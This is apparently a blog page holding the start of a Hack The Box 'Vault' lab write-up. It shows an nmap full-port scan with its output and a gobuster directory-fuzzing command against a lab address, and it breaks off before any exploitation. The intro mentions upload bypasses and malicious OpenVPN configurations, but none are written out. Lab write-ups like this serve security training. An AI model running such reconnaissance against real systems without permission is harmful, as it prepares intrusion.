<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">pL4StiC - HtB Vault</title>
<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;Vault />
<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;Vault />
<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;Vault />
<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;Vault />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://pL4sTiC1337.github.io/writeups/htb-vault/" />
<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-vault/" itemprop="url" />
<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-vault/" />
<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-vault/" />
<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-vault/" />


<meta property="og:updated_time" content="2025-02-24T22:28:29-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@pL4sTiC1337" />
    <meta name="twitter:creator" content="@pL4sTiC1337" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.145.0">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://pL4sTiC1337.github.io/">
                <img src="/images/pl4stic.png" alt="brand image">
            </a>
        
        
            <a href="https://pL4sTiC1337.github.io/">
                <h1>pL4StiC</h1>
            </a>
        
    </h1>
    <p class="lead">
    My Ramblings...
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
                
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-politeness-trap/">The Politeness Trap</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
                            </li>
                        
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/writeups/">Writeups</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-json/">HtB Json</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-sizzle/">HtB Sizzle</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-vault/">HtB Vault</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-popcorn/">HtB Popcorn</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-sightless/">Htb Sightless</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>





    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>










    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>





        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://pL4sTiC1337.github.io/writeups/htb-vault/">HtB Vault</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-02-24T22:28:29-0500" class="post-date">
        February 24, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>10 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-writeup">
        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
      </li>
      
      <li class="tag-hack the box">
        <a href="https://pL4sTiC1337.github.io/tags/hack-the-box">hack the box</a>
      </li>
      
      <li class="tag-medium">
        <a href="https://pL4sTiC1337.github.io/tags/medium">medium</a>
      </li>
      
      <li class="tag-linux">
        <a href="https://pL4sTiC1337.github.io/tags/linux">linux</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p><img src="/images/Vault.png" alt="HtB-Vault"></p>
<p>Vault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.</p>
<hr>
<h2 id="scanning">Scanning</h2>
<h3 id="nmap">nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/vault<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.121.48 
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-24 14:52 EST
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running: Linux 3.X|4.X
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span></span><span style="display:flex;"><span>OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="http---80tcp">HTTP - 80/tcp</h3>
<p><img src="/images/vault1.png" alt="vault1"></p>
<p>Attempts at directory fuzzing were not helpful. However, the <code>index.php</code> page indicates a client: &ldquo;Sparklays&rdquo; that might be a good guess for directory enumeration.  Going to <code>/sparklays</code> indicates we might be on the right track, as we get a &ldquo;Forbidden&rdquo; as opposed to &ldquo;Not Found&rdquo;.  Let&rsquo;s try fuzzing in the <code>/sparklays/</code> directory.</p>
<p><img src="/images/vault2.png" alt="vault2"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/vault<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.129.121.48/sparklays/ -w /usr/share/wordlists/dirb/big.txt -x .php
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
